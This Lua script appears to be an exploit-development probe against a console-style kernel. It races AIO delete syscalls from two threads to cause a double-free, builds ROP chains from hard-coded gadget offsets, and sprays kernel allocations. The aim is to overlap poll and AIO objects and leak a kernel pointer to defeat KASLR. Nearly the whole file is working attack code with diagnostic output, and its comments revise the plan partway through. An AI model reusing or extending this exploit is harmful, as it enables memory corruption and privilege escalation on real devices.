-- CRASH_CLASS: MODERATE
-- PROBE 67b: KASLR defeat via poll/AIO zone-64 overlap after double-free
--
-- Theory: after AIO double-free creates a freelist cycle in zone-64,
-- poll(8 fds) and AIO submit both allocate from zone-64. If they
-- share the same address, AIO's completion record writes the kernel
-- thread pointer at +0x08, which overlaps poll's fd[1] field.
-- poll's copyout preserves fd values (only writes revents), so
-- fd[1] carries the kernel address to userland.
--
-- Steps:
-- 1. Double-free (confirmed 69% rate) → freelist cycle
-- 2. Exhaust per-CPU zone-64 caches (many alloc/free cycles)
-- 3. Main thread: poll(8 sentinel fds, 100ms timeout) → alloc 64B from zone-64
-- 4. Child thread: AIO submit → alloc 48B completion record from zone-64
-- 5. poll timeout → copyout → check if fd[0..7] changed from sentinels

print("=== PROBE 67b: poll/AIO overlap KASLR ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore signals
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Eboot base for child ROP
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_pop_rcx   = eb + 0xE64
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- AIO helpers
local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x4000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one(sz)
    sz = sz or 16
    wq(N(reqs_b), uint64(1))
    wq(N(reqs_b) + 8, uint64(sz))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

-- =========================================================
-- [A] First: verify poll(209) works with sentinel values
-- =========================================================
print("")
print("[A] Verify poll works")

-- struct pollfd = { int fd; short events; short revents; } = 8 bytes
-- 8 entries = 64 bytes = zone-64
local pfds = memory.alloc(0x50)  -- 80 bytes
local NFDS = 8
local SENTINEL_FD = 0x41414141

-- Fill with sentinels
for i = 0, NFDS - 1 do
    local base = N(pfds) + i * 8
    wd(base, SENTINEL_FD + i)  -- fd = sentinel
    wd(base + 4, 0x00010001)   -- events=POLLIN(1), revents=POLLIN(1)
end

-- poll with 0 timeout (non-blocking)
local ret_poll = sgn(mk(209)(uint64(N(pfds)), uint64(NFDS), uint64(0)))
print("  poll(0ms)=" .. ret_poll)

-- Check output
local changed = 0
for i = 0, NFDS - 1 do
    local base = N(pfds) + i * 8
    local fv = rd(base) or 0
    local ev = rd(base + 4) or 0
    local events = ev % 0x10000
    local revents = math.floor(ev / 0x10000)
    if fv ~= SENTINEL_FD + i then changed = changed + 1 end
    if i < 3 then
        print(string.format("    [%d] fd=%08X events=%04X revents=%04X",
            i, fv, events, revents))
    end
end
print("  fd values changed: " .. changed)

if not alive() then print("DEAD after poll verify"); return end

-- =========================================================
-- [B] Double-free then poll + AIO spray overlap
-- =========================================================
print("")
print("[B] Double-free → poll + AIO overlap")

local VICTIMS = 16
local del_ids = memory.alloc(4 * VICTIMS + 0x10)
local stChild = memory.alloc(4 * VICTIMS + 0x10)
local stMain  = memory.alloc(4 * VICTIMS + 0x10)
local markerC = memory.alloc(8)

for trial = 1, 5 do
    if not alive() then print("  trial " .. trial .. ": DEAD"); break end
    print(string.format("  --- Trial %d ---", trial))

    -- Submit + poll victims
    local vids = {}
    for i = 1, VICTIMS do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    local vc = #vids
    if vc < 8 then print("  Too few victims: " .. vc); break end

    for i = 0, vc - 1 do
        wd(N(del_ids) + i * 4, vids[i + 1])
        wd(N(stChild) + i * 4, 0xCCCCCCCC)
        wd(N(stMain) + i * 4, 0xDDDDDDDD)
    end
    wq(N(markerC), uint64(0))

    -- Child ROP: does the race delete (662) then submits AIO spray
    -- Child stack layout:
    --   1. marker write (0xCC) to signal start
    --   2. 662 delete (race with main thread)
    --   3. marker write (0xCD) to signal delete done
    --   4. Submit 64 AIO requests (spray zone-64 completion records)
    --   5. marker write (0xCE) to signal done
    --   6. exit

    -- For AIO spray from child: need child-accessible buffers
    local spray_reqs = memory.alloc(0x30)
    local spray_ids  = memory.alloc(4 * 128)
    wq(N(spray_reqs), uint64(1))       -- cmd=1 read
    wq(N(spray_reqs) + 8, uint64(16))  -- size
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(spray_reqs) + 0x10, bl); wd(N(spray_reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(spray_reqs) + 0x18, rl); wd(N(spray_reqs) + 0x1C, rh)
    wd(N(spray_reqs) + 0x20, fd_zero); wd(N(spray_reqs) + 0x24, 0)

    -- Child ROP chain
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end

    -- 1. Write marker 0xCC
    em(g_pop_rax); em(uint64(0xCC))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    -- 2. sysarch(SET_FSBASE=129, &fake_tcb) for errno safety
    local fake_tcb = memory.alloc(0x1000)
    wq(N(fake_tcb), uint64(N(fake_tcb)))  -- self-referencing
    for i = 8, 0xFF8, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
    local fsbase_ptr = memory.alloc(8)
    wq(N(fsbase_ptr), uint64(N(fake_tcb)))
    em(g_pop_rdi); em(uint64(129))      -- SET_FSBASE
    em(g_pop_rsi); em(uint64(N(fsbase_ptr)))
    em(g_pop_rax); em(uint64(165))      -- sysarch
    em(stub)
    -- 3. 662 race delete
    em(g_pop_rdi); em(uint64(N(del_ids)))
    em(g_pop_rsi); em(uint64(vc))
    em(g_pop_rdx); em(uint64(N(stChild)))
    em(g_pop_rax); em(uint64(662))
    em(stub)
    -- 4. Write marker 0xCD (delete done)
    em(g_pop_rax); em(uint64(0xCD))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    -- 5. Submit 64 spray AIO requests (each allocates a 48B completion record)
    for s = 0, 63 do
        -- Zero the spray ID slot
        wd(N(spray_ids) + s * 4, 0)
        em(g_pop_rdi); em(uint64(1))                    -- cmd=1
        em(g_pop_rsi); em(uint64(N(spray_reqs)))        -- reqs
        em(g_pop_rdx); em(uint64(1))                    -- count=1
        em(g_pop_rcx); em(uint64(1))                    -- class=1
        em(g_pop_rax); em(uint64(669))
        -- Can't pass arg5 (no pop_r8), but 669 needs 5 args...
        -- Actually we can use the fn_addr stub which already has
        -- the correct arg passing. Let's use it differently.
        --
        -- Problem: 669 needs 5 args but we only have 4-arg control.
        -- Arg5 = ids output pointer. Without it, 669 may crash or
        -- write to a random address.
        --
        -- Alternative: submit from main thread WHILE poll is blocking.
        -- But main thread IS doing poll...
        --
        -- We can't do child-thread AIO spray without arg5 control.
        -- Let's restructure: child does 662, main does poll + spray after.
    end

    -- Actually, we can't spray AIO from child (5 args needed).
    -- New plan: child does 662 race only. Main thread does poll after.
    -- But we need poll and AIO to be concurrent...
    --
    -- Revised approach: don't try to race poll vs AIO submit.
    -- Instead: use the freelist cycle directly.
    -- After double-free, allocate pairs of objects from zone-64.
    -- One pair will share the same memory. Detect via sentinels.

    -- Reset stack
    off = 0
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8

    -- Simple child: sysarch, 662 delete, marker, exit
    em(g_pop_rax); em(uint64(0xCC))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(129))
    em(g_pop_rsi); em(uint64(N(fsbase_ptr)))
    em(g_pop_rax); em(uint64(165))
    em(stub)
    em(g_pop_rdi); em(uint64(N(del_ids)))
    em(g_pop_rsi); em(uint64(vc))
    em(g_pop_rdx); em(uint64(N(stChild)))
    em(g_pop_rax); em(uint64(662))
    em(stub)
    em(g_pop_rax); em(uint64(0xCD))
    em(g_pop_rdi); em(uint64(N(markerC)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)

    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
    wq(N(par) + 0x30, tid_p)

    -- Launch child + main 662 race
    pcall(function() mk(455)(par, uint64(0x38)) end)
    pcall(function()
        mk(662)(uint64(N(del_ids)), uint64(vc), uint64(N(stMain)))
    end)
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    local doubles = 0
    for i = 0, vc - 1 do
        local sM = rd(N(stMain) + i * 4) or 0xDDDDDDDD
        local sC = rd(N(stChild) + i * 4) or 0xCCCCCCCC
        if sM == 0 and sC == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  dbl=%d DEAD", doubles))
        break
    end
    print(string.format("  doubles=%d/%d", doubles, vc))

    if doubles == 0 then
        -- No double-free this round, skip
    else
    -- After double-free: submit AIO requests as spray
    -- Each submit allocates a 48B completion record from zone-64
    -- Due to freelist cycle, two of these may share the same address
    local spray_aio = {}
    for i = 1, 128 do
        if not alive() then break end
        local id = submit_one(16)
        if id ~= 0 then
            poll_one(id)
            table.insert(spray_aio, id)
        end
    end
    print(string.format("  Sprayed %d AIO requests", #spray_aio))

    -- Now do poll(209) calls with sentinel values
    -- poll allocates 64 bytes from zone-64
    -- If it overlaps with one of our AIO completion records,
    -- the kernel thread pointer at +0x08 appears in our fd[1]
    local hits = 0
    for p = 1, 20 do
        if not alive() then break end

        -- Fill pollfds with sentinels
        for i = 0, NFDS - 1 do
            local base = N(pfds) + i * 8
            wd(base, 0x41414141 + i + p * 0x100)  -- unique sentinel per trial
            wd(base + 4, 0x00010001)  -- events=POLLIN, revents=POLLIN
        end

        -- poll with 0 timeout (non-blocking, so alloc+check+copyout+free)
        pcall(function() mk(209)(uint64(N(pfds)), uint64(NFDS), uint64(0)) end)

        -- Check if any fd values changed
        for i = 0, NFDS - 1 do
            local base = N(pfds) + i * 8
            local fv = rd(base) or 0
            local expected = 0x41414141 + i + p * 0x100
            if fv ~= expected then
                -- fd value changed! Check if it looks like a kernel address
                local qv = rq(base)
                local h, l = get_hi_lo(qv)
                local is_kptr = (h >= 0xFFFF8000 and h < 0xFFFFFFFF)
                print(string.format("    *** poll[%d] fd changed: expected=%08X got=%08X (qword=%s)%s",
                    i, expected, fv, fmt_q(qv),
                    is_kptr and " KERNEL PTR!" or ""))
                hits = hits + 1
            end
        end
    end

    if hits == 0 then
        print("  No poll overlap detected (expected - same-CPU cache isolation)")
    end

    -- Cleanup spray
    for _, id in ipairs(spray_aio) do
        if alive() then delete_one(id) end
    end
    end -- else doubles > 0
end

if not alive() then print("DEAD"); return end

-- =========================================================
-- [C] Alternative: detect overlap through AIO-on-AIO
-- After double-free, spray AIO. Two completion records may
-- share memory. Delete one → UMA writes next-ptr at +0x00.
-- Then check if the other's status changed (via 663).
-- =========================================================
print("")
print("[C] AIO-on-AIO overlap detection")

for trial = 1, 3 do
    if not alive() then break end

    local vids = {}
    for i = 1, VICTIMS do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(vids, id) end
    end
    local vc = #vids
    if vc < 8 then break end

    for i = 0, vc - 1 do
        wd(N(del_ids) + i * 4, vids[i + 1])
        wd(N(stChild) + i * 4, 0xCCCCCCCC)
        wd(N(stMain) + i * 4, 0xDDDDDDDD)
    end
    wq(N(markerC), uint64(0))

    -- Child + main 662 race
    local stk2 = memory.alloc(0x4000)
    local sb2 = N(stk2)
    local rsp2 = sb2 + 0x2000 - ((sb2 + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb2 + i, 0) end
    off = 0
    local function em2(v) wq(rsp2 + off, v); off = off + 8 end
    em2(g_pop_rdi); em2(uint64(129))
    em2(g_pop_rsi); em2(uint64(N(fsbase_ptr)))
    em2(g_pop_rax); em2(uint64(165))
    em2(stub)
    em2(g_pop_rdi); em2(uint64(N(del_ids)))
    em2(g_pop_rsi); em2(uint64(vc))
    em2(g_pop_rdx); em2(uint64(N(stChild)))
    em2(g_pop_rax); em2(uint64(662))
    em2(stub)
    em2(g_pop_rax); em2(uint64(0xCD))
    em2(g_pop_rdi); em2(uint64(N(markerC)))
    em2(g_mov_m_rax)
    em2(g_pop_rdi); em2(uint64(0))
    em2(g_pop_rax); em2(uint64(431))
    em2(stub)

    local par2 = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par2) + i, 0) end
    wq(N(par2), g_bare_ret)
    wq(N(par2) + 0x10, uint64(sb2))
    wq(N(par2) + 0x18, uint64(0x2000))
    wq(N(par2) + 0x30, tid_p)

    pcall(function() mk(455)(par2, uint64(0x38)) end)
    pcall(function()
        mk(662)(uint64(N(del_ids)), uint64(vc), uint64(N(stMain)))
    end)
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    local doubles = 0
    for i = 0, vc - 1 do
        local sM = rd(N(stMain) + i * 4) or 0xDDDDDDDD
        local sC = rd(N(stChild) + i * 4) or 0xCCCCCCCC
        if sM == 0 and sC == 0 then doubles = doubles + 1 end
    end
    print(string.format("  trial %d: dbl=%d/%d", trial, doubles, vc))
    if not alive() or doubles == 0 then
        if doubles == 0 then
            for _, id in ipairs(vids) do
                if alive() then delete_one(id) end
            end
        end
    else
    -- Spray: submit AIO and get their 663 statuses
    local spray = {}
    for i = 1, 128 do
        if not alive() then break end
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(spray, id)
        end
    end
    print(string.format("  sprayed %d", #spray))

    -- Get baseline statuses via 663
    local base_st = {}
    local st_buf = memory.alloc(4 * #spray + 4)
    local id_buf = memory.alloc(4 * #spray + 4)
    for i = 1, #spray do
        wd(N(id_buf) + (i-1) * 4, spray[i])
        wd(N(st_buf) + (i-1) * 4, 0xDEADDEAD)
    end
    pcall(function()
        mk(663)(uint64(N(id_buf)), uint64(#spray), uint64(N(st_buf)), uint64(0), uint64(0))
    end)
    for i = 1, #spray do
        base_st[i] = rd(N(st_buf) + (i-1) * 4) or 0xDEADDEAD
    end

    -- Delete every other spray entry (frees completion records)
    -- If two share memory, deleting one corrupts the other
    local deleted = {}
    for i = 1, #spray, 2 do
        if alive() then
            delete_one(spray[i])
            deleted[spray[i]] = true
        end
    end

    -- Check remaining entries' statuses
    local anomalies = 0
    for i = 2, #spray, 2 do
        if not alive() then break end
        wd(N(one_id), spray[i])
        wd(N(one_st), 0xDEADDEAD)
        local ok = pcall(function()
            mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)), uint64(0), uint64(0))
        end)
        local st = rd(N(one_st)) or 0xDEADDEAD
        if st ~= base_st[i] and st ~= 0xDEADDEAD then
            anomalies = anomalies + 1
            if anomalies <= 5 then
                print(string.format("    *** ANOMALY id=%d: baseline=%08X now=%08X ***",
                    spray[i], base_st[i], st))
            end
        end
    end
    print(string.format("  Status anomalies: %d (out of %d checked)",
        anomalies, math.floor(#spray / 2)))

    -- Also check: delete remaining → do any crash?
    local del_crash = 0
    for i = 2, #spray, 2 do
        if not alive() then del_crash = del_crash + 1; break end
        if not deleted[spray[i]] then
            local ok = pcall(function()
                delete_one(spray[i])
            end)
            if not ok then del_crash = del_crash + 1 end
        end
    end
    if del_crash > 0 then
        print(string.format("  *** DELETE CRASHES: %d ***", del_crash))
    end
    end -- else doubles > 0
end

print("")
print("=== PROBE 67b COMPLETE ===")
